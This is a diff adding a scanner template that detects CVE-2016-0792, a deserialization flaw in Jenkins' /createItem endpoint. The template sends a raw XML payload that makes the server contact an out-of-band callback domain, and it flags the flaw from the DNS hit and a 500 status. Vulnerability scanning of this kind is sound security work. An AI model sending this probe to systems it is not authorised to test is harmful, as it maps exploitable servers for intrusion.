@@ -1,0 +1,36 @@
+id: jenkins-createItem-xstream-rce
+
+info:
+  name: Jenkins /createItem Deserialization RCE Vulnerability (CVE-2016-0792)
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: dnslog,deserialization,cve-2016-0792
+  description: |
+    Jenkins instances are vulnerable to a remote code execution exploit via the /createItem endpoint due to an unsafe deserialization vulnerability.
+
+variables:
+  reverseDomain: '{{interactsh-url}}'
+
+http:
+  - raw:
+      - |
+        POST /createItem?name=foo HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/xml
+
+        <map>
+         <entry>
+          <url>http://{{reverseDomain}}</url>
+          <int>1</int>
+         </entry>
+        </map>
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
